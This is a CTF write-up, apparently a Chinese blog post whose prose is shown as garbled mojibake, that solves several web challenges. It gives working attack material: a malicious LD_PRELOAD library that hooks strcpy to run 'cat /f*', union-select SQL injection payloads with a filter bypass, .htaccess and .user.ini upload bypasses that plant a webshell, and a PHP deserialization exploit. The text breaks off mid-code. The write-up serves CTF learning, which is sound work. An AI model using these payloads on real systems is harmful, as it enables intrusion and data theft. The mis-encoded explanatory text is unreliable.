<p>è¿™é‡Œå°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªnlæ–‡ä»¶ï¼Œç”¨<code>*</code>å°±å›æ‰§è¡ŒnlæŒ‡ä»¤ï¼Œç„¶åå‰©ä¸‹çš„aå½“ä½œå‚æ•°æ‰§è¡Œ<br>é‚£ç°åœ¨è¿™ä¸ªå‘½ä»¤é•¿åº¦é™åˆ¶çš„é—®é¢˜å·²ç»è§£å†³äº†ï¼Œç°åœ¨å¦‚ä½•è§£å†³æ²¡æœ‰å›æ˜¾çš„é—®é¢˜å‘¢ï¼Ÿ<br>ç”¨åˆ°çš„æ˜¯é‡å®šå‘ç¬¦<code>&gt;</code>è¿™ä¸ªå¯ä»¥æŠŠè¾“å‡ºé‡å®šå‘ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œå› ä¸ºé¢˜ç›®å‘Šè¯‰æˆ‘ä»¬äº†ç›®å½•æ˜¯tmpæ‰€ä»¥æˆ‘ä»¬å¯ä»¥è®¿é—®&#x2F;tmpçš„æ–‡ä»¶<br>æ¯”å¦‚æˆ‘ç°åœ¨ç”¨lså‘½ä»¤çœ‹ç°åœ¨æ ¹æ–‡ä»¶å¤¹ä¸‹é¢æœ‰ä»€ä¹ˆ  <code>ls &gt;a</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line"><span class="keyword">proc</span><span class="title"></span></span><br><span class="line"><span class="title">root</span></span><br><span class="line">run<span class="title"></span></span><br><span class="line"><span class="title">sbin</span></span><br><span class="line">srv<span class="title"></span></span><br><span class="line"><span class="title">sys</span></span><br><span class="line">tmp<span class="title"></span></span><br><span class="line"><span class="title">usr</span></span><br><span class="line">var</span><br></pre></td></tr></table></figure></div>
<p>ç°åœ¨çŸ¥é“äº†flagçš„ä½ç½®ï¼Œå°±å¯ä»¥ç”¨<code>*</code>çš„æ–¹æ³•æŸ¥çœ‹æ–‡ä»¶äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">&gt;<span class="built_in">cat</span>  <span class="comment">#åˆ›å»ºä¸€ä¸ªcatæ–‡ä»¶ï¼Œåˆ©ç”¨æ–‡ä»¶åæ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"></span><br><span class="line">* /*&gt;b  <span class="comment"># æ‰§è¡Œcatå‘½ä»¤è¯»æ ¹ç›®å½•ä¸‹é¢æ‰€æœ‰çš„æ–‡ä»¶é‡å®šå‘åˆ°bæ–‡ä»¶é‡Œ</span></span><br><span class="line"></span><br><span class="line">http://node5.anna.nssctf.cn:20381/tmp/b <span class="comment">#è®¿é—®bå¾—åˆ°flag</span></span><br></pre></td></tr></table></figure></div>

<h1 id="phonecode"><a href="#phonecode" class="headerlink" title="phonecode"></a>phonecode</h1><p><img src="https://pic1.imgdb.cn/item/67b731b5d0e0a243d4010fe3.png"><br>éšä¾¿è¾“å…¥ä¹‹åè·³è½¬åˆ°login.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Hint</span> :<span class="number">503573603</span></span><br><span class="line"><span class="attribute">Fool</span>!</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯æˆ‘æ¢äº†è¾“å…¥ä¹‹åè¿™ä¸ªhintä¹Ÿè·Ÿç€å˜äº†<br>è¿™é¢˜å®Œå…¨ä¸æ‡‚ï¼Œçœ‹äº†åˆ«çš„wpçŸ¥é“è¿™ä¸ªæ˜¯éšæœºæ•°<br>mt_srand()<br>ä½œç”¨ï¼šmt_srand(seed) ç”¨äº åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨ï¼Œå…¶ä¸­ seed æ˜¯éšæœºæ•°ç§å­ã€‚<br>å½±å“ï¼šå¦‚æœä½¿ç”¨ç›¸åŒçš„ seedï¼Œé‚£ä¹ˆåç»­è°ƒç”¨ mt_rand() ç”Ÿæˆçš„éšæœºæ•° å§‹ç»ˆç›¸åŒã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">1</span>);  <span class="comment">// è®¾ç½®éšæœºæ•°ç§å­</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// ç”Ÿæˆç¬¬ä¸€ä¸ªéšæœºæ•°</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>().<span class="string">&quot;\n&quot;</span>;  <span class="comment">// ç”Ÿæˆç¬¬äºŒä¸ªéšæœºæ•°</span></span><br><span class="line"></span><br><span class="line"><span class="number">895547922</span></span><br><span class="line"><span class="number">2141438069</span></span><br></pre></td></tr></table></figure></div>
<p>æ¯æ¬¡è¿è¡Œä¹‹åçš„ç»“æœéƒ½æ˜¯è¿™ä¸¤ä¸ªæ•°å­—ä¸ä¼šå˜ï¼Œæ‰€ä»¥åªè¦å›ºå®šç§å­ï¼Œéšæœºå‡ºæ¥çš„å€¼å°±æ˜¯å›ºå®šçš„<br>è¿™é‡Œçš„phoneå°±æ˜¯ç§å­  å› ä¸ºæ˜¾ç¤ºçš„æ˜¯ç¬¬ä¸€ä¸ªéšæœºæ•°ï¼Œé‚£å°±æŠŠç¬¬äºŒæ•°å½“ä½œéªŒè¯ç å‘é€å°±å¯ä»¥å¾—åˆ°flag</p>
<h1 id="uploadandinject"><a href="#uploadandinject" class="headerlink" title="uploadandinject"></a>uploadandinject</h1><p>é€šè¿‡è¿™é“é¢˜ï¼Œå­¦ä¹ ä¸€ä¸‹ä»€ä¹ˆæ˜¯LD_preload :</p>
<p>LD_PRELOAD æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œç”¨äºåœ¨ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€åŠ è½½æŒ‡å®šçš„å…±äº«åº“ã€‚LD_PRELOAD çš„ä½œç”¨æ˜¯åœ¨ç¨‹åºè¿è¡Œå‰ï¼Œå°†æŒ‡å®šçš„å…±äº«åº“åŠ è½½åˆ°ç¨‹åºçš„å†…å­˜ä¸­ã€‚è¿™æ ·ï¼Œç¨‹åºåœ¨è¿è¡Œæ—¶ä¼šä¼˜å…ˆä½¿ç”¨è¯¥å…±äº«åº“ä¸­çš„ç¬¦å·ï¼Œè€Œä¸æ˜¯ç³»ç»Ÿé»˜è®¤çš„ç¬¦å·ã€‚LD_PRELOAD å¯ä»¥ç”¨äºæ›¿æ¢ç¨‹åºæœ¬èº«çš„å‡½æ•°ï¼Œå¢åŠ ç¨‹åºçš„åŠŸèƒ½æˆ–è€…è°ƒè¯•ç¨‹åºã€‚</p>
<p>å¦‚æœèƒ½æ§åˆ¶LD_PRELOAD,å°±å¯ä»¥è®©ç¨‹åºåŠ è½½æˆ‘ä»¬çš„å‡½æ•°ï¼Œæ›¿ä»£åŸæ¥çš„å‡½æ•°ï¼Œè¾¾åˆ°æ”»å‡»ç›®çš„</p>
<p>çœ‹é¢˜ç›®</p>
<p><img src="https://pic1.imgdb.cn/item/67dd21b788c538a9b5c2d69f.png"></p>
<p>è¿™æ˜¯ä¸€ä¸ªæŸ¥çœ‹å›¾ç‰‡çš„ç¨‹åºï¼Œæ ¹æ®æç¤ºå…ˆå»hint.phpé‡Œé¢çœ‹æœ‰ä»€ä¹ˆ</p>
<p><code>nothing here,but I think you look look JPG,index&#39;s swp</code></p>
<p>è¯´æ˜æœ‰ä¸€ä¸ªindexçš„swpäº¤æ¢æ–‡ä»¶ ï¼ˆswpæ–‡ä»¶æ˜¯ç”¨vimè¿™ä¸ªç¼–è¾‘å™¨æ„å¤–æ¨å‡ºæˆ–è€…å´©æºƒæ—¶å€™çš„æœªä¿å­˜çš„æ–‡ä»¶ï¼‰ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ–‡ä»¶æ³„æ¼å‡ºæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p>
<p>è¿™é¢˜çš„ä¸»é¡µåœ°å€æ˜¯index.php æ ¹æ®swpçš„å‘½åè§„åˆ™è¿™ä¸ªswpå°±åœ¨.index.php.swp </p>
<p>å¯ä»¥ç›´æ¥åœ¨æœ¬åœ°ä¸‹è½½ä¸‹æ¥ï¼Œæˆ‘å°±ç”¨kaliä¸­çš„curlä¸‹è½½ä¸‹æ¥ï¼Œç„¶åç”¨vim -ræ¢å¤å¹¶ä¸”æŸ¥çœ‹å†…å®¹</p>
<p><img src="https://pic1.imgdb.cn/item/67dd234688c538a9b5c2dbfe.png"></p>
<p>è¿™é‡Œç”¨äº†putenvæŒ‡å®šäº†LD_PRELOAD é‚£æˆ‘ä»¬å¯ä»¥è‡ªå·±ä¸Šä¼ .soæ–‡ä»¶ï¼ŒæŠŠLD_PRELOADè®¾ç½®æˆä¸Šä¼ çš„.soæ–‡ä»¶ï¼ˆ.soæ–‡ä»¶å°±æ˜¯ä¸€ç§å…±äº«åº“æ–‡ä»¶ï¼Œå¯ä»¥å†™å®Œç¨‹åºåç¼–è¯‘æˆè¿™ä¸ªæ ¼å¼ï¼‰</p>
<p>åˆ©ç”¨ä»£ç  (ç½‘ä¸Šå¯ä»¥æœåˆ°</p>
<p>ç”¨strcpyçš„åŸå› æ˜¯ä¸Šé¢çš„swpä¸­çš„ç¨‹åºç”¨åˆ°äº†systemå‡½æ•°ï¼Œsystemåˆæœ‰ç”¨ç®¡é“strcpyè¿™ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥ä¿®æ”¹strcpyï¼Œè°ƒç”¨systemçš„æ—¶å€™å°±ä¼šå› ä¸ºæ‰§è¡Œæ¶æ„çš„strcpyä»è€Œæ‰§è¡Œpayloadå‡½æ•°ä¸­çš„åŠŸèƒ½ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line">â€‹</span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;cat /f*&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">â€‹</span><br><span class="line"><span class="type">char</span> *<span class="title function_">strcpy</span><span class="params">(<span class="type">char</span> *dest, <span class="type">const</span> <span class="type">char</span> *src)</span> &#123;   <span class="comment">//éœ€è¦æœç´¢æŸ¥çœ‹å‡½æ•°çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç¼–è¯‘</p>
<p>gcc -shared -fPIC -Wall hacker.c -o hacker.so</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# x86_64-linux-gnu-gcc -shared -fPIC -Wall hacker.c -o hacker.so</span><br><span class="line">hacker.c: In function â€˜strcpyâ€™:</span><br><span class="line">hacker.c:<span class="number">16</span>:<span class="number">1</span>: warning: control reaches end of non-<span class="type">void</span> function [-Wreturn-type]</span><br><span class="line">   <span class="number">16</span> | &#125;</span><br><span class="line">      | ^</span><br><span class="line">            </span><br></pre></td></tr></table></figure>

<p>ä¸‹ä¸€æ­¥å°±æ˜¯æ‰¾åˆ°ä¸Šä¼ çš„åœ°å€ï¼Œéšä¾¿ç”¨ä¸€ä¸ªç›®å½•æ‰«æå·¥å…·æ‰¾åˆ°ä¸Šä¼ åœ°å€&#x2F;upload&#x2F;upload.php</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# dirsearch -u http://node5.anna.nssctf.cn:25596/upload/</span><br><span class="line">[16:41:42] 200 -  277B  - /upload/upload.php                                  </span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå› ä¸ºä¸Šä¼ åªå…è®¸å›¾æ ¼å¼ï¼Œå…¶å®æ²¡å½±å“ï¼Œé‚£å°±æŠŠhacker.soæ”¹æˆhacker.so.jpgåç¼€ä¸å½±å“è§£æ</p>
<p>ç„¶ååœ¨ä¸»é¡µè®¿é—®ä¸Šä¼ çš„å›¾ç‰‡å°±å¾—åˆ°äº†flag</p>
<p><img src="https://pic1.imgdb.cn/item/67dd278b88c538a9b5c2dd7b.png"></p>
<h1 id="websign"><a href="#websign" class="headerlink" title="websign"></a>websign</h1><p><img src="https://pic1.imgdb.cn/item/67b846ccd0e0a243d4015de5.png"><br>æç¤ºçœ‹æºç ï¼Œä½†æ˜¯è¿™é‡Œf12å’Œå³é”®éƒ½è¢«ç¦ç”¨äº†ï¼Œå¯ä»¥åœ¨urlä¿®æ”¹ï¼ŒåŠ ä¸Šview-source:å°±å¯ä»¥äº†</p>
<h1 id="ezsql"><a href="#ezsql" class="headerlink" title="ezsql"></a>ezsql</h1><p><img src="https://pic1.imgdb.cn/item/67b86675d0e0a243d401672a.png"><br>é€šè¿‡è¿™é‡Œçš„å›æ˜¾å¯ä»¥çœ‹åˆ°æ˜¯ä»€ä¹ˆè¿‡æ»¤äº†<br>é€šè¿‡è¾“å…¥å‡ ä¸ªå¸¸è§çš„å­—ç¬¦ï¼Œå‘ç°<code>or from ro </code>è¢«è¿‡æ»¤ï¼Œè€Œä¸”è¾“å…¥çš„å†…å®¹ä¼šå€’åºè¾“å‡º<br>è¿™é‡Œè¿‡æ»¤äº†è¿™äº›å…³é”®å­—ï¼Œä½†æ˜¯å…¶å®æ˜¯æ›¿æ¢æˆç©ºæ ¼ï¼Œç”¨åŒå†™ç»•è¿‡å°±å¯ä»¥,ç„¶åå¯ä»¥è‡ªå·±å†™ä¸€ä¸ªpythonè„šæœ¬åè½¬å°±å¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">for <span class="selector-tag">i</span> in range(<span class="number">100</span>):</span><br><span class="line">    s = <span class="built_in">input</span>(<span class="string">&quot;è¾“å…¥å­—ç¬¦&quot;</span>);</span><br><span class="line">    print (s<span class="selector-attr">[::-1]</span>)</span><br></pre></td></tr></table></figure></div>
<p>åŒå†™ç»•è¿‡ç¤ºä¾‹ï¼š</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">è¾“å…¥å­—ç¬¦<span class="keyword">from</span></span><br><span class="line">morf</span><br><span class="line"></span><br><span class="line">payload:mofromrf</span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;from&#x27;</span>) <span class="keyword">AND</span> username=(<span class="string">&#x27;&#x27;</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">false</span></span><br></pre></td></tr></table></figure></div>
<p>æˆ‘ä»¬å…ˆå€’åºè¾“å…¥æƒ³è¦æ‰§è¡Œçš„è¢«è¿‡æ»¤çš„å‘½ä»¤ï¼Œç„¶ååœ¨ä¸­é—´æ’å…¥è¢«è¿‡æ»¤çš„æŒ‡ä»¤ï¼Œè¿™æ ·å­ä¸­é—´çš„ä¼šè¢«è¿‡æ»¤ï¼Œæœ€åå°±èƒ½æ‹¼æ¥å‡ºæŒ‡ä»¤<br>åé¢å°±ç”¨æ­£å¸¸çš„sqlæ€è·¯äº† (ä¸­é—´è‡ªè¡Œç”¨åŒå†™ç»•è¿‡)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>çˆ†åº“</span><br><span class="line">è¾“å…¥å­—ç¬¦<span class="number">1</span><span class="string">&#x27;) union select 1,database()# </span></span><br><span class="line"><span class="string">#)(esabatad,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:UUCTF</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>çˆ†è¡¨</span><br><span class="line">è¾“å…¥å­—ç¬¦<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();#</span></span><br><span class="line"><span class="string">#;)(esabatad=amehcs_elbat erehw selbat.amehcs_noitamrofni morf )eman_elbat(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">Your <span class="keyword">Login</span> <span class="type">name</span>:<span class="number">1</span></span><br><span class="line">Your <span class="keyword">Password</span>:flag,users</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>çˆ†å­—æ®µ</span><br><span class="line">è¾“å…¥å­—ç¬¦<span class="number">1</span><span class="string">&#x27;) union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#</span></span><br><span class="line"><span class="string">#&#x27;</span>galf<span class="string">&#x27;=eman_elbat erehw snmuloc.amehcs_noitamrofni morf )eman_nmuloc(tacnoc_puorg,1 tceles noinu )&#x27;</span><span class="number">1</span></span><br><span class="line">your <span class="keyword">sql</span>:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> passwd=(<span class="string">&#x27;1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="built_in">column_name</span>) <span class="keyword">from</span> information_schema.<span class="keyword">columns</span> <span class="keyword">where</span> <span class="built_in">table_name</span>=<span class="string">&#x27;flag&#x27;</span>#<span class="string">&#x27;) AND username=(&#x27;&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">Your Login name:1</span></span><br><span class="line"><span class="string">Your Password:UUCTF</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">4.çˆ†å€¼</span></span><br><span class="line"><span class="string">è¾“å…¥å­—ç¬¦1&#x27;</span>) <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(<span class="string">&#x27;UUCTF&#x27;</span>) <span class="keyword">from</span> UUCTF.flag#</span><br><span class="line"><span class="meta">#galf.FTCUU morf )FTCUU(tacnoc_puorg,1 tceles noinu )&#x27;1</span></span><br></pre></td></tr></table></figure></div>


<h1 id="ez-upload"><a href="#ez-upload" class="headerlink" title="ez_upload"></a>ez_upload</h1><p><img src="https://pic1.imgdb.cn/item/67b88fa6d0e0a243d40171b2.png"><br>å…ˆéšä¾¿ä¸Šä¼ ä¸€ä¸ªæ™®é€šçš„ä¸€å¥è¯æœ¨é©¬çœ‹çœ‹æœ‰ä»€ä¹ˆé™åˆ¶<br><img src="https://pic1.imgdb.cn/item/67b89015d0e0a243d40171be.png"><br>å…ˆæ˜¯æ€€ç–‘åªæ˜¯åœ¨å‰ç«¯åšæ ¡éªŒï¼Œç„¶åç”¨bpä¿®æ”¹åç¼€è¯•è¯•ã€‚ä½†æ˜¯è¿˜æ˜¯è¿™ä¸ª<br>ç„¶åç”¨æ’ä»¶æ£€æµ‹ä¸€ä¸‹æœåŠ¡å™¨ï¼Œå‘ç°æ˜¯apacheï¼Œé‚£å°±ç”¨.htaccessæ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶æ˜¯apacheæœåŠ¡çš„ä¸€ä¸ªè§£æé…ç½®æ–‡ä»¶<br>æˆ‘ä»¬è®©è¿™ä¸ªç›®å½•ä¸‹çš„.jpgæ–‡ä»¶éƒ½è§£ææˆphpæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="comment">#.htaccess</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;/.jpg$&quot;</span>&gt;</span></span><br><span class="line">    <span class="attribute">SetHandler</span> application/x-httpd-php</span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯ä¸Šä¼ è¿™ä¸ªæ–‡ä»¶å‘ç°ä¹Ÿè¢«è¿‡æ»¤ï¼Œè¿˜æœ‰ä¸€ä¸ªå’Œè¿™ä¸ªåŠŸèƒ½ç±»ä¼¼çš„é…ç½®æ–‡ä»¶å«åš.user.ini,å¯ä»¥ä¸Šä¼ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="INI"><figure class="iseeu highlight /ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=<span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªé…ç½®æ–‡ä»¶çš„æ„æ€æ˜¯æ¯ä¸ªphpæ–‡ä»¶åœ¨æ‰§è¡Œä¹‹å‰éƒ½ä¼šåŒ…å«1.jpgè¿™ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å½“ä½œphpæ‰§è¡Œï¼Œä½†æ˜¯è¿™é‡Œæ²¡æœ‰ä»€ä¹ˆå¯ä»¥æ‰§è¡Œçš„phpæ–‡ä»¶<br>çœ‹å…¶ä»–å¤§ä½¬çš„wpå­¦ä¹ åˆ°äº†åŸæ¥æ˜¯è¦ç”¨apacheè§£ææ¼æ´<br>Apache è§£ææ¼æ´ä¸»è¦æ˜¯å› ä¸º Apache é»˜è®¤ä¸€ä¸ªæ–‡ä»¶å¯ä»¥æœ‰å¤šä¸ªç”¨ã€‚åˆ†å‰²å¾—åç¼€ï¼Œå½“æœ€å³è¾¹çš„åç¼€æ— æ³•è¯†åˆ«ï¼ˆmime.types æ–‡ä»¶ä¸­çš„ä¸ºåˆæ³•åç¼€ï¼‰åˆ™ç»§ç»­å‘å·¦çœ‹ï¼Œç›´åˆ°ç¢°åˆ°åˆæ³•åç¼€æ‰è¿›è¡Œè§£æï¼ˆä»¥æœ€åä¸€ä¸ªåˆæ³•åç¼€ä¸ºå‡†ï¼‰<br>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¿®æ”¹ä¸€ä¸ªä¸åˆæ³•çš„åç¼€ï¼Œæ¯”å¦‚è¿™ä¸ªæ–‡ä»¶åæ”¹æˆ<code>2.php.aaa</code>è¿™æ ·å­è§£æçš„æ—¶å€™å°±ä¼šè§£ææˆphpæ–‡ä»¶<br>ä½†æ˜¯è¿˜è¦æ³¨æ„ç”¨bpä¿®æ”¹ä¸€ä¸‹MIME ä¿®æ”¹æˆjpgæ ¼å¼ç»•è¿‡MIMEæ£€æµ‹<br><img src="https://pic1.imgdb.cn/item/67b89695d0e0a243d40172cb.png"><br>å‘ç°æˆåŠŸä¸Šä¼     æ–‡ä»¶å­˜å‚¨åœ¨: upload&#x2F;2.php.aaa.php<br>ç„¶åå¯ä»¥ç”¨èšå‰‘è¿æ¥æ‰¾åˆ°flagäº†</p>
<h1 id="ez-unser"><a href="#ez-unser" class="headerlink" title="ez_unser"></a>ez_unser</h1><p>é¢˜ç›®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">###very___so___easy!!!!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="number">1</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="number">2</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/test&quot;:3/i&#x27;</span>,<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$bbb</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">ä½ è¾“å…¥çš„ä¸æ­£ç¡®ï¼ï¼ï¼æä»€ä¹ˆï¼ï¼</span><br></pre></td></tr></table></figure></div>
<p>æœ€ç»ˆæˆ‘ä»¬æƒ³æ‰§è¡Œ<code>eval($this-&gt;a);</code>æˆ‘ä»¬å°±è®©<code>$this -&gt; a</code>æˆä¸ºæˆ‘ä»¬æƒ³è¦æ‰§è¡Œçš„å‘½ä»¤<br>ä½†æ˜¯è¿™é‡Œçš„wakeupä¼šæŠŠaé‡æ–°èµ‹å€¼ï¼Œä¹‹å‰ç»•è¿‡wakeupçš„æ–¹æ³•æ˜¯ä¿®æ”¹åºåˆ—åŒ–ä¸­çš„å˜é‡ä¸ªæ•°ï¼Œä½†æ˜¯è¿™é‡Œå¤šäº†é™åˆ¶ï¼Œä¸è®©ä¿®æ”¹<br>è¿™é‡Œåˆ©ç”¨çš„æ˜¯<code>$this-&gt;b=$this-&gt;c</code>ï¼Œphpä¸­å¦‚æœä¸¤ä¸ªå˜é‡åŒæ—¶æŒ‡å‘ä¸€ä¸ªåœ°å€ä¹Ÿå¯ä»¥ç»•è¿‡wakeupï¼Œå’Œezpopä¸­çš„ç»•è¿‡æ–¹æ³•ä¸€æ ·<br>åŸç†å°±æ˜¯æˆ‘ä»¬è®©bæŒ‡å‘açš„åœ°å€ï¼Œbå€¼ä¿®æ”¹çš„æ—¶å€™ï¼Œå› ä¸ºå…¬ç”¨ä¸€ç‰‡å†…å­˜å°±å›è®©açš„å€¼ä¹Ÿå˜äº†</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span 